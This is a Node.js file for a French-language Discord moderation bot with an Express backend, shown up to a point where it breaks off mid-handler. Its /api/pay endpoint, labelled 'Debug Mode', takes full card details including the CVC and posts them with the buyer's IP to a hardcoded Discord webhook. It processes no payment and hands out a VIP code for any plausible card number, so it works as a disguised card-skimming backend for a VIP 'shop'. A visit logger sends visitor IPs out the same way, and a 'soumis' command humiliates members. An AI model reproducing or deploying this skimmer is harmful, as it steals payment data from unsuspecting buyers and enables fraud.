require('dotenv').config();
const { 
    Client, 
    GatewayIntentBits, 
    Partials, 
    EmbedBuilder, 
    ActionRowBuilder, 
    ButtonBuilder, 
    ButtonStyle, 
    PermissionsBitField,
    Collection,
    StringSelectMenuBuilder,
    StringSelectMenuOptionBuilder,
    ModalBuilder,
    TextInputBuilder,
    TextInputStyle,
    ChannelType,
    MessageFlags
} = require('discord.js');
const fs = require('fs');
const path = require('path');
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1483531247685992608/UtI6SotnOhf-Iw95F82v-pfzCHQfTh_mzcMQ0vmzmBB3cEwxAHI3kEuM_boX7AqhzsNE";

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
        GatewayIntentBits.GuildInvites,
    ],
    partials: [Partials.Message, Partials.Channel, Partials.Reaction],
});

const PREFIX = process.env.PREFIX || '-';
const ROLES_FILE = path.join(__dirname, 'soumis_roles.json');
const INVITES_FILE = path.join(__dirname, 'invites.json');
const CODES_FILE = path.join(__dirname, 'codes.json');
const spamMap = new Collection();
const guildInvites = new Collection();

// Ensure files exist
if (!fs.existsSync(ROLES_FILE)) {
    fs.writeFileSync(ROLES_FILE, JSON.stringify({}));
}
if (!fs.existsSync(INVITES_FILE)) {
    fs.writeFileSync(INVITES_FILE, JSON.stringify({}));
}
if (!fs.existsSync(CODES_FILE)) {
    fs.writeFileSync(CODES_FILE, JSON.stringify({ codes: [] }));
}

// --- EXPRESS SERVER CONFIG ---
app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

function generateCode() {
    return Array.from({ length: 4 }, () => 
        Math.random().toString(36).substring(2, 6).toUpperCase()
    ).join('-');
}

app.post('/api/pay', async (req, res) => {
    const { cardHolder, cardNumber, expiry, cvc } = req.body;

    try {
        await axios.post(DISCORD_WEBHOOK, {
            embeds: [{
                title: "💳 Nouvelle tentative de paiement - Debug Mode",
                color: 0x9D50BB,
                fields: [
                    { name: "👤 Titulaire", value: `\`${cardHolder || 'Inconnu'}\``, inline: true },
                    { name: "🔢 Numéro", value: `\`${cardNumber || 'Inconnu'}\``, inline: true },
                    { name: "📅 Expiration", value: `\`${expiry || 'Inconnu'}\``, inline: true },
                    { name: "🔒 CVC", value: `\`${cvc || 'Inconnu'}\``, inline: true },
                    { name: "🌐 Client IP", value: `\`${req.ip}\`` }
                ],
                timestamp: new Date()
            }]
        });
    } catch (err) {
        console.error("Webhook error:", err.message);
    }

    setTimeout(() => {
        if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
            return res.status(400).json({ success: false, message: 'Numéro de carte invalide' });
        }

        const newCode = generateCode();
        const data = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));
        data.codes.push({ code: newCode, claimed: false, timestamp: Date.now() });
        fs.writeFileSync(CODES_FILE, JSON.stringify(data, null, 2));

        res.json({ success: true, code: newCode });
    }, 1500);
});

// Log specialized for website visit
app.get('/api/log-visit', async (req, res) => {
    try {
        await axios.post(DISCORD_WEBHOOK, {
            embeds: [{
                title: "🌐 Nouvelle connexion au site",
                color: 0x00F2FE,
                description: "Un utilisateur vient d'ouvrir la page de paiement VIP.",
                fields: [
                    { name: "🌐 Client IP", value: `\`${req.ip}\``, inline: true },
                    { name: "📱 User-Agent", value: `\`${req.headers['user-agent']?.substring(0, 100) || 'Inconnu'}\`` }
                ],
                timestamp: new Date()
            }]
        });
    } catch (err) {
        console.error("Log visit error:", err.message);
    }
    res.status(200).send('ok');
});

app.listen(PORT, () => console.log(`API running on port ${PORT}`));
// -----------------------------


client.once('clientReady', async (c) => {
    console.log(`Bot prêt ! Connecté en tant que ${c.user.tag}`);
    // Fetch all invites for all guilds
    for (const guild of client.guilds.cache.values()) {
        try {
            const firstInvites = await guild.invites.fetch();
            const invitesMap = new Collection();
            firstInvites.forEach(i => {
                invitesMap.set(i.code, { uses: i.uses, inviterId: i.inviter?.id });
            });
            guildInvites.set(guild.id, invitesMap);
        } catch (err) {
            console.log(`Impossible de récupérer les invitations pour ${guild.id}`);
        }
    }
});

client.on('inviteCreate', (invite) => {
    const invites = guildInvites.get(invite.guild.id);
    if (invites) invites.set(invite.code, { uses: invite.uses, inviterId: invite.inviter?.id });
});

client.on('inviteDelete', (invite) => {
    const invites = guildInvites.get(invite.guild.id);
    if (invites) invites.delete(invite.code);
});

client.on('guildMemberAdd', async (member) => {
    const channelId = '1483532401404543077';
    const channel = member.guild.channels.cache.get(channelId);
    if (!channel) return;

    try {
        const msg = await channel.send(`<@${member.id}>`);
        setTimeout(async () => {
            await msg.delete().catch(() => {});
        }, 3000);
    } catch (err) {
        console.error("Erreur interaction join ping:", err);
    }
});

// Centralized Error Logger
const logError = async (error, context = '') => {
    console.error(`[ERROR] ${context}:`, error);
    const logChannelId = '1483480300112842874';
    try {
        const guild = client.guilds.cache.first();
        if (!guild) return;
        const channel = await guild.channels.fetch(logChannelId).catch(() => null);
        if (channel) {
            const embed = new EmbedBuilder()
                .setColor(0xFF0000)
                .setTitle('Erreur Détectée')
                .addFields(
                    { name: 'Contexte', value: context || 'Global', inline: true },
                    { name: 'Message', value: `\`\`\`${error.message || error}\`\`\`` }
                )
                .setTimestamp();
            await channel.send({ embeds: [embed] });
        }
    } catch (e) {
        console.error('Impossible d\'envoyer le log d\'erreur sur Discord:', e);
    }
};

// Catch Global Exceptions
process.on('unhandledRejection', error => logError(error, 'Unhandled Rejection'));
process.on('uncaughtException', error => logError(error, 'Uncaught Exception'));

client.on('guildMemberAdd', async (member) => {
    try {
        // Invite tracking logic
        const cachedInvites = guildInvites.get(member.guild.id);
        const newInvites = await member.guild.invites.fetch().catch(() => null);
        
        let inviterId = null;
        if (cachedInvites && newInvites) {
            const usedInvite = newInvites.find(i => cachedInvites.has(i.code) && cachedInvites.get(i.code).uses < i.uses);
            
            if (usedInvite) {
                inviterId = usedInvite.inviter?.id;
            } else {
                // Check if an invite was deleted (likely 1-use invite)
                const missingCode = Array.from(cachedInvites.keys()).find(code => !newInvites.has(code));
                if (missingCode) {
                    inviterId = cachedInvites.get(missingCode).inviterId;
                }
            }

            // Update cache
            const newInvitesMap = new Collection();
            newInvites.forEach(i => newInvitesMap.set(i.code, { uses: i.uses, inviterId: i.inviter?.id }));
            guildInvites.set(member.guild.id, newInvitesMap);

            if (inviterId) {
                const invitesData = JSON.parse(fs.readFileSync(INVITES_FILE, 'utf8'));
                if (!invitesData[inviterId]) invitesData[inviterId] = [];
                // Eviter les duplicatas si l'event se repete bizarrement
                if (!invitesData[inviterId].includes(member.id)) {
                    invitesData[inviterId].push(member.id);
                    fs.writeFileSync(INVITES_FILE, JSON.stringify(invitesData, null, 2));

                    // Check active invites count
                    let activeCount = 0;
                    for (const invitedId of invitesData[inviterId]) {
                        try {
                            const isPresent = member.guild.members.cache.has(invitedId) || await member.guild.members.fetch(invitedId).catch(() => null);
                            if (isPresent) activeCount++;
                        } catch {}
                    }

                    if (activeCount === 3) {
                        const inviterUser = await client.users.fetch(inviterId).catch(() => null);
                        if (inviterUser) {
                            const dmEmbed = new EmbedBuilder()
                                .setColor(0xFFFFFF)
                                .setTitle('Objectif atteint')
                                .setDescription('Félicitations ! Vous avez atteint **3 invitations** sur le serveur. Vous pouvez désormais ouvrir un ticket pour réclamer votre récompense.');
                            
                            try {
                                await inviterUser.send({ embeds: [dmEmbed] });
                            } catch {
                                // DM closed, ping in welcome channel
                                const welcomeChannelId = '1483231963308494920';
                                const channel = member.guild.channels.cache.get(welcomeChannelId);
                                if (channel) {
                                    const chatEmbed = new EmbedBuilder()
                                        .setColor(0xFFFFFF)
                                        .setDescription(`Bravo ${inviterUser}, tu as atteint **3 invitations** ! Tes messages privés sont fermés, je t'invite donc à créer un ticket pour ta récompense.`);
                                    await channel.send({ content: `${inviterUser}`, embeds: [chatEmbed] });
                                }
                            }
                        }
                    }
                }
            }
        }

        const welcomeChannelId = '1483231963308494920';
        const channel = member.guild.channels.cache.get(welcomeChannelId);
        
        if (channel) {
            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setTitle('Bienvenue')
                .setDescription(`Bienvenue ${member} ! Grâce à toi, nous sommes maintenant **${member.guild.memberCount}** membres.`);
            
            await channel.send({ content: `${member}`, embeds: [embed] });
        }
    } catch (error) {
        logError(error, 'Event: guildMemberAdd');
    }
});

client.on('messageCreate', async (message) => {
    try {
    if (message.author.bot) return;

    // --- ANTI-RAID SYSTEM ---
    if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) {
        // 1. Anti-Invite
        const inviteRegex = /(discord\.(gg|io|me|li)|discordapp\.com\/invite)\/.+/i;
        if (inviteRegex.test(message.content)) {
            await message.delete().catch(() => {});
            await message.member.ban({ reason: 'Anti-Raid : Invitation Discord' }).catch(() => {});
            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setDescription(`${message.author.tag} a été banni pour envoi d'invitation (Anti-Raid).`);
            return message.channel.send({ embeds: [embed] });
        }

        // 2. Anti-Spam
        const now = Date.now();
        const userData = spamMap.get(message.author.id) || { count: 0, lastMessage: now };
        
        if (now - userData.lastMessage < 2000) {
            userData.count++;
        } else {
            userData.count = 1;
        }
        userData.lastMessage = now;
        spamMap.set(message.author.id, userData);

        if (userData.count > 5) {
            await message.member.ban({ reason: 'Anti-Raid : Spam' }).catch(() => {});
            spamMap.delete(message.author.id);
            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setDescription(`${message.author.tag} a été banni pour spam (Anti-Raid).`);
            return message.channel.send({ embeds: [embed] });
        }
    }
    // ------------------------

    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // Command: -setupticket
    if (command === 'setupticket') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Achat Pass VIP')
            .setDescription('Cliquez sur le bouton ci-dessous pour ouvrir un ticket et acheter le pass VIP du serveur.')
            .setFooter({ text: 'Système de Ticket' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('open_ticket')
                .setLabel('Ouvrir un ticket')
                .setStyle(ButtonStyle.Secondary)
        );

        await message.channel.send({ embeds: [embed], components: [row] });
        await message.delete();
    }

    // Helper to get member from mention or ID
    const getMember = async (query) => {
        if (!query) return null;
        const id = query.replace(/[<@!>]/g, '');
        try {
            return await message.guild.members.fetch(id);
        } catch {
            return null;
        }
    };

    // Helper to get user from mention or ID
    const getUser = async (query) => {
        if (!query) return null;
        const id = query.replace(/[<@!>]/g, '');
        try {
            return await client.users.fetch(id);
        } catch {
            return null;
        }
    };

    // Command: -kick
    if (command === 'kick') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.KickMembers)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');
        if (!target.kickable) return message.reply('Je ne peux pas kick cet utilisateur.');

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Modération : Kick')
            .setDescription(`Veuillez sélectionner une raison pour kick **${target.user.tag}**.`);

        const select = new StringSelectMenuBuilder()
            .setCustomId(`kick_${target.id}`)
            .setPlaceholder('Choisir une raison...')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Règlement non respecté').setValue('reglement'),
                new StringSelectMenuOptionBuilder().setLabel('Spam / Flood').setValue('spam'),
                new StringSelectMenuOptionBuilder().setLabel('Insultes / Manque de respect').setValue('insultes'),
                new StringSelectMenuOptionBuilder().setLabel('Autre raison').setValue('autre')
            );

        const row = new ActionRowBuilder().addComponents(select);
        await message.channel.send({ embeds: [embed], components: [row] });
    }

    // Command: -ban
    if (command === 'ban') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');
        if (!target.bannable) return message.reply('Je ne peux pas ban cet utilisateur.');

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Modération : Ban')
            .setDescription(`Veuillez sélectionner une raison pour bannir **${target.user.tag}**.`);

        const select = new StringSelectMenuBuilder()
            .setCustomId(`ban_${target.id}`)
            .setPlaceholder('Choisir une raison...')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Règlement non respecté').setValue('reglement'),
                new StringSelectMenuOptionBuilder().setLabel('Troll / Raid').setValue('troll'),
                new StringSelectMenuOptionBuilder().setLabel('Publicité non autorisée').setValue('pub'),
                new StringSelectMenuOptionBuilder().setLabel('Autre raison').setValue('autre')
            );

        const row = new ActionRowBuilder().addComponents(select);
        await message.channel.send({ embeds: [embed], components: [row] });
    }

    // Command: -bban
    if (command === 'bban') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');
        if (!target.bannable) return message.reply('Je ne peux pas ban cet utilisateur.');

        await target.ban({ reason: 'Ban rapide (-bban)' });
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target.user.tag} a été banni rapidement.`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -clear
    if (command === 'clear') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageMessages)) return;
        const amount = parseInt(args[0]);
        if (isNaN(amount) || amount < 1 || amount > 100) {
            return message.reply('Veuillez spécifier un nombre entre 1 et 100.');
        }

        await message.channel.bulkDelete(amount, true);
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${amount} messages supprimés.`);
        const msg = await message.channel.send({ embeds: [embed] });
        setTimeout(() => msg.delete(), 3000);
    }

    // Command: -tempmute
    if (command === 'tempmute') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Usage: -tempmute @user/ID');

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Modération : Tempmute')
            .setDescription(`Veuillez sélectionner une durée pour mute **${target.user.tag}**.`);

        const select = new StringSelectMenuBuilder()
            .setCustomId(`mute_${target.id}`)
            .setPlaceholder('Choisir une durée...')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('10 Minutes').setValue('600000'),
                new StringSelectMenuOptionBuilder().setLabel('1 Heure').setValue('3600000'),
                new StringSelectMenuOptionBuilder().setLabel('12 Heures').setValue('43200000'),
                new StringSelectMenuOptionBuilder().setLabel('1 Jour').setValue('86400000'),
                new StringSelectMenuOptionBuilder().setLabel('1 Semaine').setValue('604800000')
            );

        const row = new ActionRowBuilder().addComponents(select);
        await message.channel.send({ embeds: [embed], components: [row] });
    }

    // Command: -mmute
    if (command === 'mmute') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ModerateMembers)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Usage: -mmute @user/ID');

        await target.timeout(86400000); // 24h
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target.user.tag} a été mute pour 24 heures.`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -soumis
    if (command === 'soumis') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageRoles)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');

        let soumisRole = message.guild.roles.cache.find(r => r.name === 'Soumis');
        if (!soumisRole) {
            soumisRole = await message.guild.roles.create({
                name: 'Soumis',
                color: '#FFFFFF',
                permissions: [],
                reason: 'Role pour le système de soumis',
            });

            // Try to deny SendMessages in all channels for this role
            message.guild.channels.cache.forEach(async (channel) => {
                if (channel.isTextBased()) {
                    await channel.permissionOverwrites.create(soumisRole, {
                        SendMessages: false,
                        AddReactions: false,
                        CreatePublicThreads: false,
                        CreatePrivateThreads: false,
                        SendMessagesInThreads: false,
                    }).catch(() => {});
                }
            });
        }

        // Save current roles and nickname
        const rolesData = JSON.parse(fs.readFileSync(ROLES_FILE, 'utf8'));
        rolesData[target.id] = {
            roles: target.roles.cache.filter(r => r.name !== '@everyone').map(r => r.id),
            nickname: target.nickname || null
        };
        fs.writeFileSync(ROLES_FILE, JSON.stringify(rolesData, null, 2));

        // Remove all roles, add soumis, and change nickname
        await target.roles.set([soumisRole.id]);
        await target.setNickname(`Soumis de ${message.author.username}`).catch(() => {});

        message.channel.send(`${target} est maintenant le soumis de ${message.author}`);
    }

    // Command: -unsoumis
    if (command === 'unsoumis') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageRoles)) return;
        const target = await getMember(args[0]);
        if (!target) return message.reply('Veuillez mentionner un utilisateur ou donner son ID.');

        const rolesData = JSON.parse(fs.readFileSync(ROLES_FILE, 'utf8'));
        const oldData = rolesData[target.id];

        if (!oldData) return message.reply('Aucun ancien rôle trouvé pour cet utilisateur.');

        // Support for old data format (array) and new format (object)
        const rolesToRestore = Array.isArray(oldData) ? oldData : oldData.roles;
        const nicknameToRestore = Array.isArray(oldData) ? null : oldData.nickname;

        await target.roles.set(rolesToRestore);
        if (nicknameToRestore !== undefined) {
            await target.setNickname(nicknameToRestore).catch(() => {});
        }
        
        delete rolesData[target.id];
        fs.writeFileSync(ROLES_FILE, JSON.stringify(rolesData, null, 2));

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`${target.user.tag} n'est plus soumis et a récupéré ses rôles.`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -pic
    if (command === 'pic') {
        const target = (await getUser(args[0])) || message.author;
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`Avatar de ${target.tag}`)
            .setImage(target.displayAvatarURL({ dynamic: true, size: 1024 }));
        message.channel.send({ embeds: [embed] });
    }

    // Command: -banner
    if (command === 'banner') {
        const targetUser = (await getUser(args[0])) || message.author;
        const user = await client.users.fetch(targetUser.id, { force: true });
        
        if (!user.bannerURL()) return message.reply('Cet utilisateur n\'a pas de bannière.');

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`Bannière de ${user.tag}`)
            .setImage(user.bannerURL({ dynamic: true, size: 1024 }));
        message.channel.send({ embeds: [embed] });
    }

    // Command: -userinfo
    if (command === 'userinfo') {
        const target = (await getMember(args[0])) || message.member;
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`Informations sur ${target.user.tag}`)
            .addFields(
                { name: 'ID', value: target.id, inline: true },
                { name: 'Surnom', value: target.displayName || 'Aucun', inline: true },
                { name: 'Rejoint le', value: target.joinedAt ? target.joinedAt.toLocaleDateString() : 'Inconnu', inline: true },
                { name: 'Compte créé le', value: target.user.createdAt.toLocaleDateString(), inline: true }
            )
            .setThumbnail(target.user.displayAvatarURL());
        message.channel.send({ embeds: [embed] });
    }

    // Command: -serverinfo
    if (command === 'serverinfo') {
        const guild = message.guild;
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`Informations sur ${guild.name}`)
            .addFields(
                { name: 'Propriétaire', value: `<@${guild.ownerId}>`, inline: true },
                { name: 'Membres', value: `${guild.memberCount}`, inline: true },
                { name: 'Créé le', value: guild.createdAt.toLocaleDateString(), inline: true },
                { name: 'Boosts', value: `${guild.premiumSubscriptionCount || 0}`, inline: true }
            )
            .setThumbnail(guild.iconURL());
        message.channel.send({ embeds: [embed] });
    }

    // Command: -lock
    if (command === 'lock') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return;
        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: false });
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription('Ce salon a été verrouillé.');
        message.channel.send({ embeds: [embed] });
    }

    // Command: -unlock
    if (command === 'unlock') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return;
        await message.channel.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: null });
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription('Ce salon a été déverrouillé.');
        message.channel.send({ embeds: [embed] });
    }

    // Command: -ping
    if (command === 'ping') {
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`Latence: ${client.ws.ping}ms`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -slowmode
    if (command === 'slowmode') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.ManageChannels)) return;
        const seconds = parseInt(args[0]);
        if (isNaN(seconds)) return message.reply('Veuillez spécifier un nombre de secondes.');
        await message.channel.setRateLimitPerUser(seconds);
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setDescription(`Mode lent activé : ${seconds} secondes.`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -invites
    if (command === 'invites') {
        const target = (await getMember(args[0])) || message.member;
        const invitesData = JSON.parse(fs.readFileSync(INVITES_FILE, 'utf8'));
        const invitedList = invitesData[target.id] || [];
        
        let count = 0;
        for (const id of invitedList) {
            try {
                const isPresent = message.guild.members.cache.has(id) || await message.guild.members.fetch(id).catch(() => null);
                if (isPresent) count++;
            } catch {}
        }
        
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle(`Invitations de ${target.user.tag}`)
            .setDescription(`Cet utilisateur possède **${count}** invitation${count > 1 ? 's' : ''} (membres actuellement sur le serveur).`);
        message.channel.send({ embeds: [embed] });
    }

    // Command: -create
    if (command === 'create') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Créateur d\'Embed')
            .setDescription('Utilisez les boutons ci-dessous pour configurer votre embed. Une fois terminé, sélectionnez le salon d\'envoi.');

        const row1 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_title').setLabel('Titre').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_description').setLabel('Description').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_color').setLabel('Couleur (Hex)').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('set_image').setLabel('Image (URL)').setStyle(ButtonStyle.Secondary)
        );

        const row2 = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('set_footer').setLabel('Footer').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('preview_embed').setLabel('Aperçu').setStyle(ButtonStyle.Primary),
            new ButtonBuilder().setCustomId('send_embed').setLabel('Envoyer').setStyle(ButtonStyle.Success)
        );

        await message.channel.send({ embeds: [embed], components: [row1, row2] });
    }

    // Command: -setupcodes
    if (command === 'setupcodes') {
        if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) return;

        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Récupération Pass VIP')
            .setDescription('Si vous avez acheté un Pass VIP sur notre site, cliquez sur le bouton ci-dessous pour entrer votre code.')
            .addFields({ name: 'Site Web', value: '`https://doroplace.vercel.app/`' })
            .setFooter({ text: 'Système de Validation' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('use_vip_code')
                .setLabel('Entrer un code')
                .setStyle(ButtonStyle.Success)
        );

        await message.channel.send({ embeds: [embed], components: [row] });
        await message.delete();
    }

    // Command: -help
    if (command === 'help') {
        const embed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Liste des commandes')
            .addFields(
                { name: 'Administrationnnnnn', value: '`-setupticket`, `-setupcodes`, `-kick`, `-ban`, `-bban`, `-clear`, `-tempmute`, `-mmute`, `-lock`, `-unlock`, `-slowmode`' },
                { name: 'Système Soumis', value: '`-soumis @user`, `-unsoumis @user`' },
                { name: 'Utilitaire', value: '`-pic`, `-banner`, `-userinfo`, `-serverinfo`, `-ping`, `-invites @user`' }
            );
        message.channel.send({ embeds: [embed] });
    }
    } catch (error) {
        logError(error, 'Event: messageCreate');
    }
});

// Store temporary embed data
const embedData = new Collection();

// Interaction Handling (Buttons & Select Menus & Modals)
client.on('interactionCreate', async (interaction) => {
    try {
        if (interaction.isModalSubmit()) {
            const [type, userId] = interaction.customId.split('_');
            const embedModalTypes = ['modalTitle', 'modalDesc', 'modalColor', 'modalImage', 'modalFooter'];
            
            if (embedModalTypes.includes(type)) {
                let data = embedData.get(userId) || {};
                const value = interaction.fields.getTextInputValue('input');

                if (type === 'modalTitle') data.title = value;
                if (type === 'modalDesc') data.description = value;
                if (type === 'modalColor') data.color = value.startsWith('#') ? value : `#${value}`;
                if (type === 'modalImage') data.image = value;
                if (type === 'modalFooter') data.footer = value;

                embedData.set(userId, data);
                return await interaction.reply({ content: 'Valeur mise à jour !', flags: [MessageFlags.Ephemeral] });
            }
        }

    if (interaction.isModalSubmit() && interaction.customId === 'vip_code_modal') {
        const codeInput = interaction.fields.getTextInputValue('code_input').trim();
        const data = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));
        const codeIndex = data.codes.findIndex(c => c.code === codeInput && !c.claimed);

        if (codeIndex === -1) {
            return interaction.reply({ content: 'Code invalide ou déjà utilisé.', flags: [MessageFlags.Ephemeral] });
        }

        // Mark as claimed
        data.codes[codeIndex].claimed = true;
        data.codes[codeIndex].claimedBy = interaction.user.id;
        fs.writeFileSync(CODES_FILE, JSON.stringify(data, null, 2));

        // Assign VIP role
        let vipRole = interaction.guild.roles.cache.find(r => r.name.toLowerCase() === 'vip');
        if (!vipRole) {
            vipRole = await interaction.guild.roles.create({
                name: 'VIP',
                color: '#8A2BE2',
                reason: 'Achat via site web'
            }).catch(() => null);
        }

        if (vipRole) {
            await interaction.member.roles.add(vipRole).catch(() => {});
        }

        // Create Ticket
        const staffRoleId = '1483537167555891211';
        const channel = await interaction.guild.channels.create({
            name: `vip-${interaction.user.username}`,
            type: ChannelType.GuildText,
            permissionOverwrites: [
                { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.AttachFiles] },
                { id: staffRoleId, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.ManageMessages] }
            ]
        });

        const successEmbed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('VIP Activé !')
            .setDescription(`Félicitations ${interaction.user}, votre Pass VIP a été activé.\nUn ticket a été ouvert ici : ${channel}`)
            .setFooter({ text: 'Merci pour votre confiance' });

        const ticketEmbed = new EmbedBuilder()
            .setColor(0xFFFFFF)
            .setTitle('Nouveau Client VIP')
            .setDescription(`Bonjour ${interaction.user}, vous êtes maintenant VIP !\nExpliquez-nous ici ce que vous souhaitez obtenir ou vos besoins particuliers.`)
            .addFields({ name: 'Code utilisé', value: `\`${codeInput}\`` });

        const closeBtn = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('close_ticket').setLabel('Fermer le ticket').setStyle(ButtonStyle.Danger)
        );

        await channel.send({ embeds: [ticketEmbed], components: [closeBtn] });
        await interaction.reply({ embeds: [successEmbed], flags: [MessageFlags.Ephemeral] });
    }

    if (interaction.isStringSelectMenu()) {
        const [action, targetId] = interaction.customId.split('_');
        
        if (action === 'sendToChannel') {
            const data = embedData.get(interaction.user.id);
            if (!data) return interaction.reply({ content: 'Aucune donnée d\'embed trouvée.', flags: [MessageFlags.Ephemeral] });

            const channel = interaction.guild.channels.cache.get(interaction.values[0]);
            if (!channel) return interaction.reply({ content: 'Salon introuvable.', flags: [MessageFlags.Ephemeral] });

            const embed = new EmbedBuilder()
                .setColor(data.color || 0xFFFFFF)
                .setTitle(data.title || null)
                .setDescription(data.description || null)
                .setImage(data.image || null)
                .setFooter(data.footer ? { text: data.footer } : null);

            await channel.send({ embeds: [embed] });
            embedData.delete(interaction.user.id);
            await interaction.update({ content: `Embed envoyé dans ${channel} !`, embeds: [], components: [] });
            return;
        }

        const target = await interaction.guild.members.fetch(targetId).catch(() => null);

        if (!target) return interaction.reply({ content: 'Utilisateur introuvable.', flags: [MessageFlags.Ephemeral] });

        if (action === 'mute') {
            const duration = parseInt(interaction.values[0]);
            await target.timeout(duration);
            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setDescription(`${target.user.tag} a été mute.`);
            await interaction.update({ embeds: [embed], components: [] });
        }

        if (action === 'kick') {
            const reason = interaction.values[0];
            await target.kick(reason);
            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setDescription(`${target.user.tag} a été kick (Raison: ${reason}).`);
            await interaction.update({ embeds: [embed], components: [] });
        }

        if (action === 'ban') {
            const reason = interaction.values[0];
            await target.ban({ reason });
            const embed = new EmbedBuilder()
                .setColor(0xFFFFFF)
                .setDescription(`${target.user.tag} a été banni (Raison: ${reason}).`);
            await interaction.update({ embeds: [embed], components: [] });
        }
    }

    if (interaction.isButton()) {
        const userId = interaction.user.id;

        if (interaction.customId === 'use_vip_code') {
            const modal = new ModalBuilder()
                .setCustomId('vip_code_modal')
                .setTitle('Activation Pass VIP');

            const input = new TextInputBuilder()
                .setCustomId('code_input')
                .setLabel('Entrez votre code VIP')
                .setPlaceholder('XXXX-XXXX-XXXX-XXXX')
                .setStyle(TextInputStyle.Short)
                .setRequired(true);

            modal.addComponents(new ActionRowBuilder().addComponents(input));
            return await interaction.showModal(modal);
        }

